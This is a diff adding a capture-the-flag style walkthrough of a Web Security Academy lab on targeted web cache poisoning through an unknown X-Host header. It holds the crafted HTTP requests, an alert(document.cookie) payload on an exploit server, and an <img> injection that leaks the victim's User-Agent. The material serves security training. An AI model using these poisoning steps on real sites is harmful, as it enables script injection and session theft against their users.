@@ -179,3 +179,35 @@ As you can see i copied the two vulnerable headers into the request, and i give 
 us to exploit-0a2b00ec035108fc808e612501b2002f.exploit-server.net/resources/js/tracking.js which will be the: alert(document.cookie);
 So when the page loads in, and this runs down, we will get an alert. So send the request until we get x-cache: hit. And refresh the page in the browser.
 
+Task 4:
+///Lab: Targeted web cache poisoning using an unknown header///
+
+Open the site in burp. Sen the GET / request to repeater. In burpsuit there is an extension called 'Param miner'. install it. then go to the http history, and click on the GET / request with right mouse button,
+pick extensions/param miner/guess headers. From the result you can see which X header is vulnerable:
+Identified parameter on 0ad5006704768c90801f03e300e7009c.h1-web-security-academy.net: x-host~%h:%s
+So its the X-host. Now Add the new line to the request like this:
+GET / HTTP/1.1
+Host: 0ad5006704768c90801f03e300e7009c.h1-web-security-academy.net
+X-Host: exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net
+Cookie: session=vWihLhx2ucqESBKW3F7fvzcKAgPmdJGr
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+.....
+Send this request, and search on the 'exploit-0ad000b104bf8c5a80a702b601e3004a' in the source code:
+       <script type="text/javascript" src="//exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net/resources/js/tracking.js"></script>
+Copy this out: /resources/js/tracking.js Go to the exploit server and paste this line into the File: part. To the body part: alert(document.cookie); and store it. Send it until X-cache wont be equal with 'hit'.
+Now for us its alerting the site, but we have to send it to the victim somehow. Here is an importart thing what we have to notice..which is a header:Vary: User-Agent. This header means that if you have 
+a different version from the browser then the victim, the vulnerability wont work. and we have to figure out somehow, what browser the victim use. To figure out, make a post with the following message:
+<img src="https://https://exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net/resources/js/tracking.js" />
+Refresh the page for a few times, and go to your exploit servers log. you will see something like this:
+10.0.4.140      2026-04-01 14:20:40 +0000 "GET /foo HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+Copy out the Mozilla/5....537.36 and paste into our repeater request like this:
+GET / HTTP/1.1
+Host: 0ad5006704768c90801f03e300e7009c.h1-web-security-academy.net
+X-Host: exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net
+Cookie: session=vWihLhx2ucqESBKW3F7fvzcKAgPmdJGr
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+...
+
+Send this request many times, and if the victim checked the site the alert will load in, and we solved the lab.
